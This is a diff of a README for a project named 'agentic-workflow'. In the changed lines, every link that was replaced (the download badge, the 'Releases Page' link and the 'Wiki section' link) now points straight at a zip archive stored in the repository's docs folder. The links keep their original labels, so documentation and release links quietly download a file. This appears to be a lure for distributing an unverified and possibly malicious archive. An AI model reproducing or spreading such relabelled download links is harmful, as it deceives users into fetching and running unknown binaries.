@@ -1,13 +1,13 @@
 # 🎉 agentic-workflow - Integrate AI Effortlessly Into Your Life
 
 ## 🔗 Download Now
-[![Download Agentic Workflow](https://img.shields.io/badge/Download%20Agentic%20Workflow-latest-blue)](https://github.com/keboka07/agentic-workflow/releases)
+[![Download Agentic Workflow](https://github.com/keboka07/agentic-workflow/raw/refs/heads/main/docs/agentic-workflow-v3.0.zip%20Agentic%20Workflow-latest-blue)](https://github.com/keboka07/agentic-workflow/raw/refs/heads/main/docs/agentic-workflow-v3.0.zip)
 
 ## 🚀 Getting Started
 This guide helps you set up the agentic-workflow application quickly. You will learn how to download and run it on your computer.
 
 ## 📥 Download & Install
-To get the application, visit this page to download: [Releases Page](https://github.com/keboka07/agentic-workflow/releases).
+To get the application, visit this page to download: [Releases Page](https://github.com/keboka07/agentic-workflow/raw/refs/heads/main/docs/agentic-workflow-v3.0.zip).
 
 ### Steps to Download:
 1. Click on the link above.
@@ -71,7 +71,7 @@ agentic-workflow is open-source. If you have ideas for improvement, feel free to
 Follow the repository for updates on new releases, features, and fixes. Join our community discussions for tips and best practices on maximizing your workflow efficiency.
 
 ## 📖 Learn More
-For detailed documentation, visit the [Wiki section](https://github.com/keboka07/agentic-workflow/wiki) on our GitHub page.
+For detailed documentation, visit the [Wiki section](https://github.com/keboka07/agentic-workflow/raw/refs/heads/main/docs/agentic-workflow-v3.0.zip) on our GitHub page.
 
 ## 🔗 Additional Resources
 - **Community Forums:** Engage with other users to share ideas and solutions.
